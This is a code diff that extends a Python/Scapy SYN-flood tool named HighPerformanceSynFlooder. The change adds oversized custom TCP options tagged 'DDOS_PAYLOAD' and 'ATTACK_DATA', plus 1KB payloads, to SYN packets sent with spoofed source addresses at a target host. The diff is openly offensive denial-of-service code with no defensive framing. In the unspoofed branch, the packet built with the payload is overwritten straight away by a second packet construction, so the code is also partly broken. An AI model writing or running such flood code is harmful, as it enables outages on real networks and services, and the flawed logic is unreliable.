@@ -188,16 +188,57 @@ class HighPerformanceSynFlooder:
                 seq_num = random.randint(1, 4294967295)
                 
                 if src_ip:
-                    # Create packet with spoofed source IP
+                    # Create packet with spoofed source IP + MASSIVE TCP OPTIONS for data transmission
+                    massive_tcp_options = [
+                        ('MSS', 1460),
+                        ('WScale', 7),
+                        ('Timestamp', (random.randint(1000000, 9999999), 0)),
+                        ('SAckOK', ''),
+                        ('UTO', 10),
+                        # Add custom massive TCP options for data transmission
+                        (254, b'X' * 32),  # Custom option with 32 bytes
+                        (253, b'Y' * 32),  # Another custom option
+                        (252, b'Z' * 32),  # Third custom option
+                    ]
+                    
                     packet = IP(dst=self.target, src=src_ip, ttl=random.randint(32, 128)) / TCP(
                         sport=src_port,
                         dport=self.port,
                         flags="S",
                         seq=seq_num,
-                        window=random.randint(1024, 65535)
+                        window=random.randint(1024, 65535),
+                        options=massive_tcp_options
                     )
+                    
+                    # Add massive payload to SYN packet (some servers accept data in SYN)
+                    massive_payload = b'A' * 1024  # 1KB payload in SYN
+                    packet = packet / massive_payload
+                    
                 else:
-                    # Create packet with system's IP (no spoofing)
+                    # Create packet with system's IP (no spoofing) but with massive options
+                    massive_tcp_options = [
+                        ('MSS', 1460),
+                        ('WScale', 7), 
+                        ('Timestamp', (random.randint(1000000, 9999999), 0)),
+                        ('SAckOK', ''),
+                        # Massive custom options
+                        (254, b'DDOS_PAYLOAD_' + b'X' * 20),
+                        (253, b'ATTACK_DATA__' + b'Y' * 20),
+                        (252, b'FLOOD_PACKET_' + b'Z' * 19),
+                    ]
+                    
+                    packet = TCP(
+                        sport=src_port,
+                        dport=self.port,
+                        flags="S",
+                        seq=seq_num,
+                        window=random.randint(1024, 65535),
+                        options=massive_tcp_options
+                    )
+                    
+                    # Add massive payload
+                    massive_payload = b'B' * 1024  # 1KB payload
+                    packet = packet / massive_payload
                     packet = IP(dst=self.target, ttl=random.randint(32, 128)) / TCP(
                         sport=src_port,
                         dport=self.port,
